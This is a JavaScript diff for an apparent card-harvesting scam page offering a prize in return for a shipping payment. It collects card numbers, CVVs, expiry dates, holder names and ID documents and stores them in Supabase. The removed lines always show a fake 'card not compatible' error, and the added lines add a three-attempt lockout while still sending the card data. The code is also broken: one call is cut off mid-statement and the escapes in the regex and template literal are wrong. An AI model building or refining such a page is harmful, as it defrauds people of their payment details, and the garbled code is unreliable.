@@ -557,11 +557,106 @@ fVenc.addEventListener('input', function() {
 /* ================================================================
    PAGO → GUARDAR EN SUPABASE → ÉXITO
    ================================================================ */
+// Variables para controlar intentos
+var intentosFallidos = 0;
+var bloqueadoHasta = null;
+var maxIntentos = 3;
+var tiempoEspera = 30; // segundos
+
+// Recuperar estado anterior si existe
+function recuperarEstadoIntentos() {
+  var estadoGuardado = localStorage.getItem('estadoIntentosPago');
+  if (estadoGuardado) {
+    var estado = JSON.parse(estadoGuardado);
+    intentosFallidos = estado.intentosFallidos || 0;
+    bloqueadoHasta = estado.bloqueadoHasta ? new Date(estado.bloqueadoHasta) : null;
+  }
+}
+
+// Guardar estado de intentos
+function guardarEstadoIntentos() {
+  localStorage.setItem('estadoIntentosPago', JSON.stringify({
+    intentosFallidos: intentosFallidos,
+    bloqueadoHasta: bloqueadoHasta
+  }));
+}
+
+// Verificar si el usuario está bloqueado
+function verificarBloqueo() {
+  if (bloqueadoHasta && new Date() < bloqueadoHasta) {
+    var segundosRestantes = Math.ceil((bloqueadoHasta - new Date()) / 1000);
+    return {
+      bloqueado: true,
+      segundosRestantes: segundosRestantes
+    };
+  } else if (bloqueadoHasta && new Date() >= bloqueadoHasta) {
+    // El bloqueo ha expirado, resetear estado
+    intentosFallidos = 0;
+    bloqueadoHasta = null;
+    guardarEstadoIntentos();
+  }
+  return { bloqueado: false };
+}
+
+// Actualizar estado del botón de pago según el estado actual
+function actualizarEstadoBoton() {
+  var payBtn = document.getElementById('payBtn');
+  var payHint = document.getElementById('payHint');
+  var estado = verificarBloqueo();
+  
+  if (estado.bloqueado) {
+    payBtn.disabled = true;
+    payBtn.textContent = `Espera ${estado.segundosRestantes}s`;
+    payHint.textContent = `Debes esperar ${estado.segundosRestantes} segundos para intentar de nuevo`;
+    
+    // Actualizar el contador cada segundo
+    var intervalo = setInterval(function() {
+      var nuevoEstado = verificarBloqueo();
+      if (nuevoEstado.bloqueado) {
+        payBtn.textContent = `Espera ${nuevoEstado.segundosRestantes}s`;
+        payHint.textContent = `Debes esperar ${nuevoEstado.segundosRestantes} segundos para intentar de nuevo`;
+      } else {
+        clearInterval(intervalo);
+        payBtn.disabled = false;
+        payBtn.textContent = 'Pagar envío y canjear';
+        payHint.textContent = '\u00a0';
+      }
+    }, 1000);
+  } else if (intentosFallidos >= maxIntentos) {
+    payBtn.disabled = true;
+    payBtn.textContent = 'Intentos agotados';
+    payHint.textContent = 'Has alcanzado el máximo de intentos permitidos';
+  } else {
+    payBtn.disabled = false;
+    payBtn.textContent = 'Pagar envío y canjear';
+    payHint.textContent = '\u00a0';
+  }
+}
+
+// Inicializar el estado al cargar la página
+recuperarEstadoIntentos();
+actualizarEstadoBoton();
+
 document.getElementById('payBtn').addEventListener('click', async function() {
   var payBtn = this;
-  var msgEl  = document.getElementById('payMsg');
+  var msgEl = document.getElementById('payMsg');
   msgEl.className = 'pay-msg';
   msgEl.textContent = '';
+
+  // Verificar si está bloqueado
+  var estado = verificarBloqueo();
+  if (estado.bloqueado) {
+    msgEl.textContent = `Debes esperar \${estado.segundosRestantes} segundos para intentar de nuevo`;
+    msgEl.className = 'pay-msg err';
+    return;
+  }
+
+  // Verificar si se alcanzó el máximo de intentos
+  if (intentosFallidos >= maxIntentos) {
+    msgEl.textContent = 'Has alcanzado el máximo de intentos permitidos';
+    msgEl.className = 'pay-msg err';
+    return;
+  }
 
   // Validar campos requeridos
   var numVal  = document.getElementById('fNum').value.replace(/\s/g,'');
@@ -572,7 +667,7 @@ document.getElementById('payBtn').addEventListener('click', async function() {
 
   var errores = [];
   if (numVal.length < 16)      errores.push('Número de tarjeta incompleto');
-  if (!/^\d{2}\/\d{2}$/.test(vencVal)) errores.push('Vencimiento inválido (MM/AA)');
+  if (!/^\d{2}\/\d{2}\$/.test(vencVal)) errores.push('Vencimiento inválido (MM/AA)');
   if (cvvVal.length < 3)       errores.push('CVV incompleto');
   if (!nomVal)                 errores.push('Ingresá el nombre del titular');
   if (tipoActual === 'credito' && !docVal) errores.push('Ingresá el documento del titular');
@@ -599,29 +694,9 @@ document.getElementById('payBtn').addEventListener('click', async function() {
   if (tipoActual === 'credito') payload.documento = docVal;
 
   try {
-    // Intenta guardar los datos, pero no importa si falla
-    await guardarEnSupabase(payload);
-  } catch (err) {
-    // Silenciosamente ignora cualquier error de conexión
-    console.warn('Error al guardar en Supabase (oculto al usuario):', err.message);
-  }
-
-  // Siempre muestra este mensaje, sin importar si el guardado tuvo éxito o no
-  msgEl.textContent = 'Tu tarjeta no es compatible';
-  msgEl.className = 'pay-msg err';
-
-  // Restablece el estado del botón
-  payBtn.disabled = false;
-  payBtn.textContent = 'Pagar envío y canjear';
-  document.getElementById('payHint').textContent = '\u00a0';
-});
-
-document.getElementById('backSuc').addEventListener('click', function() {
-  document.getElementById('success').classList.remove('show');
-});
-document.getElementById('goApp').addEventListener('click', function() {
-  document.getElementById('success').classList.remove('show');
-});
+    // Solo enviar a Supabase si no se ha alcanzado el máximo de intentos
+    if (intentosFallidos < maxIntentos) {
+      await guardarEnSupabase(payload
 /* ================================================================
    CONFETI
    ================================================================ */
